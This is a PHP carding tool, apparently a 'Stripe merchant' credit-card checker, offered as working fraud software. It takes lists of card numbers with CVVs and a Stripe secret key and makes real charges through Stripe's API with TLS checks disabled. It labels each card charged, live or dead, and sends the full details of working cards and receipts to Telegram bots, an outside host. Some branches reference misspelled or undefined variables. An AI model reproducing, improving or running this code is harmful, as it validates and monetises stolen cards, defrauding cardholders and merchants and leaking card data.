<?php


//===================== [ MADE BY ゆə͜͡ʍᴏん  ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['amt'];
$sk =  $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

//AMOUNT ARRAY//


$amtarray = $mul = $amt * 100;




//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');
//echo "<br><b>Result1: </b> $result1<br>";

#-------------------[2nd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amtarray.'&currency=usd&payment_method_types[]=card');
$result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
//echo "<b>Result2: </b> $result2<br>";

#-------------------[3rd REQ]--------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
$result3 = curl_exec($ch);
$dcode = Getstr($result3,'"decline_code": "','"');
$reason = Getstr($result3,'"reason": "','"');
$riskl = Getstr($result3,'"risk_level": "','"');
$seller_msg = Getstr($result3,'"seller_message": "','"');
$cvccheck = Getstr($result3,'"cvc_check": "','"');

if ($cvccheck == "pass") $cvccheck = "Pass! ✅";
elseif ($cvccheck == "fail") $cvccheck = "Fail! ❌";
elseif ($cvccheck == "unavailable") $cvccheck = "NA";



$respo = "D_code: <b>$dcode | </b>Reason: <b>$reason | </b>Cvv: <b>$cvccheck | </b>Risk: <b>$riskl | </b>Msg: <b>$seller_msg</b><br>";
//echo "<b><br>Result: </b>$respo<br>";



$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));



//=================== [ RESPONSES ] ===================//

if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>CC:  '.$lista.'  『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span>  <br>➤ Response: $'.$amt.' Charged ✅ <br> ➤ Receipt : HIDDEN  @D3M0N_Giveaway</a><br>';
   $msg = 
"CC : ".$lista."
➤ Response : $$amt Charged ✅
➤ Receipt : HIDDEN  @D3M0N_Giveaway\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
    $msg2 = 
"CC : ".$lista."
➤ Response : $$amt Charged ✅
➤ Receipt : $receipturl\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => ' ','text' => $msg2 ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Cvv Live\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
    
   

}


elseif(strpos($result1, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Insufficient Funds\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
}

elseif(strpos($result3, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Security code is incorrect\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY ゆə͜͡ʍᴏん</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Transaction Not Allowed\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
    }
    elseif(strpos($result3, "authentication_required")) {
    	echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    	$msg = 
    "APPROVED CC: ".$lista." 
    
Result: 32DS Required\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
   } 
   elseif(strpos($result3, "card_error_authentication_required")) {
    	echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    	$msg = 
    "APPROVED CC: ".$lista." 
    
Result: 32DS Required\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    	$msg = 
    "APPROVED CC: ".$lista." 
    
Result: 32DS Required\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    	$msg = 
    "APPROVED CC: ".$lista." 
    
Result: 32DS Required\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
   } 
elseif(strpos($result3, "incorrect_cvc" )) {
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Security code is incorrect\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3, "card_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result3,"currency_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'APPROVED</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
    $msg = 
    "APPROVED CC: ".$lista." 
    
Result: Cvv Live\r\n";
    $apiToken = "BOT TOKEN";
    $logger = ['chat_id' => $idd,'text' => $msg ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );

}
elseif(strpos($result3, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: API KEY DEAD OR INVALID『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: API KEY DEAD/REVOKED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
}
else {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: RATE LIMIT REACHED『ゆə‌ʍᴏん ⁪⁬⁮⁮』</span><br>';
   
   
      
}



//===================== [ MADE BY ゆə͜͡ʍᴏん ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

//echo "<br><b>Result3: </b> $result3<br>";

curl_close($ch);
ob_flush();
?>